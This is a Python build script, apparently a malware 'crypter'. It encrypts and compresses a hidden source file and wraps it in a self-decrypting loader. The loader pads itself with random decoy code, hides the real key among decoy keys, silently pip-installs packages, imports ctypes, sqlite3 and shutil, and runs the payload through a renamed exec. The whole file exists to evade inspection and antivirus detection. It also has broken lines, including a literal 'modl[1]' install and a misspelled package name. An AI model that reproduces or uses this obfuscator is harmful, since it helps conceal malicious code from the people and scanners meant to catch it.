import argparse
import zlib
import base64
import subprocess
import random
import os
import string
from cryptography.fernet import Fernet
import logging
import sys
import time
# Constants and configurations
BUILD_PATH = "./build"
TEMP_FILE_PATH = "./Build/temp.py"
ENCRYPTION_KEY_FILE = "encryption_key.txt"

# Configure logging
logging.basicConfig(level=logging.INFO)

def install_missing_package(package_name):
    """
    Install missing Python package using subprocess.
    """
    try:
        subprocess.run(f'python -m pip install {package_name}', shell=True, check=True)
    except subprocess.CalledProcessError as e:
        logging.error(f"Failed to install package {package_name}: {e}")
        sys.exit(1)

def import_or_install(package_name, import_name=None):
    """
    Import a package, or install it if not present.
    """
    if not import_name:
        import_name = package_name

    try:
        return __import__("cryptography")
    except ImportError:
        install_missing_package(package_name)
        return __import__("cryptography")

Crypto = import_or_install('cryptography', 'cryptography')

# Function Definitions
def generate_random_string(length=19, chars=string.ascii_letters + string.digits):
    """
    Generate a random string of given length.
    """
    return ''.join(random.choice(chars) for _ in range(length))

def generate_random_string(length=10):
    """
    Generate a random string of the given length with the first character as a letter.
    """
    first_char = random.choice(string.ascii_letters)
    rest_of_chars = ''.join(random.choices(string.ascii_letters + string.digits, k=length - 1))
    return first_char + rest_of_chars

def generate_fake_code(num_vars=10, num_funcs=15, num_classes=10):
    """
    Generate fake variables, functions, and classes for obfuscation.
    """
    fake_code = [f"{generate_random_string()} = {repr(random.randint(1000000, 100000000))}" for _ in range(num_vars)]

    # List of real function names with meaningful implementations
    def get_user_info():
        return {'username': generate_random_string(7), 'age': random.randint(18, 99)}

    def get_channel_name():
        return repr(generate_random_string())

    def get_repos():
        return [repr(generate_random_string()) for _ in range(random.randint(1, 5))]

    fake_functions = [get_user_info, get_channel_name, get_repos]

    fake_classes = [f"class {generate_random_string()}:\n    def __init__(self):\n        self.data = {repr(random.choice([True, False]))}\n    def get_data(self):\n        return self.data" for _ in range(num_classes)]

    # Combine functions and classes into a single list
    all_code = fake_code + fake_functions + fake_classes
    
    # Convert functions to strings
    all_code = [str(item()) if callable(item) else str(item) for item in all_code]
    all_code = random.sample(all_code, len(all_code))
    return "\n".join(all_code)

def encrypt_code(code, key):
    """
    Encrypt and encode the code.
    """
    cipher_suite = Fernet(key)
    encrypted_code = cipher_suite.encrypt(zlib.compress(code))
    return base64.b64encode(encrypted_code).decode('utf-8')

def random_class_name():
    return ''.join(random.choice(string.ascii_letters) + random.choice(string.ascii_letters + string.digits) for _ in range(19))

def main():
    parser = argparse.ArgumentParser(description='Obfuscate and create an executable.')
    parser.add_argument('name', help='Name for the obfuscated file (Do not include the extension)')
    args = parser.parse_args()

    # Key generation and encryption
    key = Fernet.generate_key()
    with open(ENCRYPTION_KEY_FILE, "wb") as key_file:
        key_file.write(key)

    with open(TEMP_FILE_PATH, "rb") as code_file:
        code = code_file.read()

    encoded_code = encrypt_code(code, key)

    # Obfuscation
    all_fake_code = generate_fake_code()

    a = random_class_name()
    e = random_class_name()
    def generate_random_keys(num_keys):
        keys = [Fernet.generate_key() for _ in range(num_keys)]
        return keys
    
    key_list = []
    key_list.extend(generate_random_keys(random.randint(10,25)))
    keyssss = random.randint(0, len(key_list))
    key_list.insert(keyssss, key)

    obfuscated_code = f'''
import time
{all_fake_code}
import zlib
import base64
{all_fake_code}
from sys import executable, stderr
try:
    from cryptography.fernet import Fernet
except ImportError:
    subprocess.run('python -m pip install cryptography', shell=True)
    from cryptography.fernet import Fernet

import subprocess
requirements = [
    ["requests", "requests"],
    ["cryptography", "cryptography"]
]
for modl in requirements:
    try: __import__(modl[0])
    except:
        subprocess.Popen(executable + " -m pip install modl[1]", shell=True)
        time.sleep(3)

    
ModuleRequirements = [["cryptography", "cryptography"]]
for module in ModuleRequirements:
    try:        
        __import__(module[0])
    except:
        try:
            subprocess.Popen(executable + " -m pip install pycrytodome --quiet", shell=True)
        except:
            subprocess.Popen(executable + " -m pip install Crypto --quiet", shell=True)

import requests

from cryptography.fernet import Fernet as {a}
encoded_code = "{encoded_code}"
{e} = exec
encrypted_code = base64.b64decode(encoded_code)
{all_fake_code}
s = {key_list}
for key in s:
    try:
        decrypted_code = {a}(key.decode("utf-8")).decrypt(encrypted_code)
        break
    except Exception as e:
        pass
{all_fake_code}
decompressed_code = zlib.decompress(decrypted_code).decode('utf-8')
{e}(decompressed_code)
{all_fake_code}
'''
    name = args.name+'.py'
    s = base64.b64encode(obfuscated_code.encode('utf-8'))
    aw = random_class_name()    
    with open(f'{BUILD_PATH}/{name}', "w+") as obfu_file:
        obfu_file.write(f'''

from sys import executable, stderr
{all_fake_code}
import ctypes;import base64,subprocess,sqlite3,json,shutil
import time
ModuleRequirements = [["cryptography", "cryptography"]]

for module in ModuleRequirements:
    try:        
        __import__(module[0])
    except:
        try:
            subprocess.Popen(executable + " -m pip install cryptography --quiet", shell=True)
        except:
            subprocess.Popen(executable + " -m pip install cryptography --quiet", shell=True)

requirements = [
    ["requests", "requests"],
    ["cryptography", "cryptography"]
]
for modl in requirements:
    try: __import__(modl[0])
    except:
        subprocess.Popen(executable + " -m pip install modl[1]", shell=True)
        time.sleep(3)
        
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

from json import loads, dumps
from urllib.request import Request, urlopen
try:
    from cryptography.fernet import Fernet
except:
    subprocess.run("python -m pip install cryptography")

try:
    from cryptography.fernet import Fernet
except:
    subprocess.run("python -m pip install cryptography", shell=True)

try:
    import requests
except:
    subprocess.run("python -m pip install requests", shell=True)


import requests
from cryptography.fernet import Fernet
{all_fake_code}
{e} = exec
{all_fake_code}
import concurrent.futures
{aw}="{s.decode("utf-8")}"
{e}(base64.b64decode({aw}))
{all_fake_code}''') 

    obfuscated_file_path = os.path.join(BUILD_PATH, f"{name}")
        # Clean up
    os.remove(ENCRYPTION_KEY_FILE)
    logging.info(f"The code has been encrypted, Filename: {obfuscated_file_path}")

if __name__ == "__main__":
    main()
